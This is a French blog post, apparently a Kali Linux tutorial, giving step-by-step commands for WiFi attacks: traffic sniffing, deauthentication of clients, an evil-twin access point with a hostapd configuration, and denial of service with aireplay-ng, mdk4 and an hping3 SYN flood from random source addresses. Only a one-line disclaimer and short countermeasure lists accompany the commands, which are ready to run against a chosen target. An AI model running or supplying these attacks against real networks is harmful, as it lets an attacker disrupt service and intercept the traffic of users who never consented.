---
title: Attaques WiFi
time: 2024-12-17 12:00:00
categories: [Hacking]
tags: [kali,wifi,hack,cybersecurity]
image: /assets/posts/WiFi/wifi.png 
---


# 🌐 Atlas des Attaques WiFi : Comprendre pour Mieux Protéger

## 🚨 Préambule Éthique

> **ATTENTION :** Ce guide est strictement à des fins éducatives et professionnelles.

## 📡 1. Attaque par Écoute (Sniffing)

### 🎯 Objectif
Intercepter et analyser le trafic réseau sans fil de manière non autorisée.

### 🛠 Équipement Requis
- Ordinateur sous Kali Linux
- Carte WiFi compatible mode monitor
- Antenne WiFi externe (recommandé)

### 🔍 Étapes Détaillées d'Exploitation

#### Étape 1 : Préparation de l'Environnement
```bash
# Vérifier les interfaces réseau
ifconfig

# Passer l'interface en mode monitor
airmon-ng start wlan0

# Vérifier l'interface monitor
iwconfig
```

#### Étape 2 : Scan des Réseaux Disponibles
```bash
# Lister les réseaux WiFi
airodump-ng wlan0mon

# Cibler un réseau spécifique
airodump-ng -c [CHANNEL] --bssid [MAC_ADDRESS] -w capture wlan0mon
```

#### Étape 3 : Capture des Données
```bash
# Forcer la réauthentification
aireplay-ng --deauth 100 -a [BSSID] wlan0mon

# Analyser les captures
wireshark capture-01.cap
```

### 🛡️ Contre-Mesures
- Utiliser uniquement WPA3
- Chiffrer les communications sensibles
- Éviter les réseaux publics non sécurisés

## 🕳️ 2. Attaque Evil Twin

### 🎯 Objectif
Créer un point d'accès malveillant identique à un réseau légitime.

### 🛠 Équipement Requis
- Ordinateur sous Kali Linux
- Carte WiFi avec mode AP
- Antenne WiFi puissante

### 🔍 Étapes Détaillées d'Exploitation

#### Étape 1 : Préparation de l'Interface
```bash
# Configurer l'interface en mode monitor
airmon-ng start wlan0

# Identifier les réseaux à proximité
airodump-ng wlan0mon
```

#### Étape 2 : Clonage du Réseau
```bash
# Installer les outils
apt-get install hostapd

# Créer un fichier de configuration
nano /etc/hostapd/hostapd.conf

# Exemple de configuration
interface=wlan0
driver=nl80211
ssid=[NOM_RESEAU_ORIGINAL]
channel=6
hw_mode=g
wpa=2
wpa_passphrase=[MOT_DE_PASSE]
```

#### Étape 3 : Déconnexion des Clients
```bash
# Forcer la déconnexion
aireplay-ng --deauth 100 -a [BSSID_ORIGINAL] wlan0mon
```

#### Étape 4 : Lancement du Point d'Accès Malveillant
```bash
# Démarrer le point d'accès
hostapd /etc/hostapd/hostapd.conf
```

### 🛡️ Contre-Mesures
- Vérification des certificats
- Authentification 802.1X
- Utilisation d'un VPN

## 🚫 3. Attaque par Déni de Service (DoS)

### 🎯 Objectif
Rendre un réseau WiFi inutilisable par saturation.

### 🛠 Équipement Requis
- Ordinateur sous Kali Linux
- Carte WiFi compatible mode monitor

### 🔍 Étapes Détaillées d'Exploitation

#### Étape 1 : Reconnaissance
```bash
# Scanner les réseaux
airodump-ng wlan0mon
```

#### Étape 2 : Attaque de Déconnexion
```bash
# Attaque de déauthentification
aireplay-ng --deauth 0 -a [BSSID] wlan0mon

# Attaque massive
mdk4 wlan0mon d -c [CHANNEL] -B [BSSID]
```

#### Étape 3 : Saturation du Réseau
```bash
# Envoi de paquets broadcast
hping3 -S -p 80 --flood --rand-source [IP_CIBLE]
```

### 🛡️ Contre-Mesures
- Configurer des pare-feux avancés
- Limiter les connexions simultanées
- Mettre à jour régulièrement les firmwares



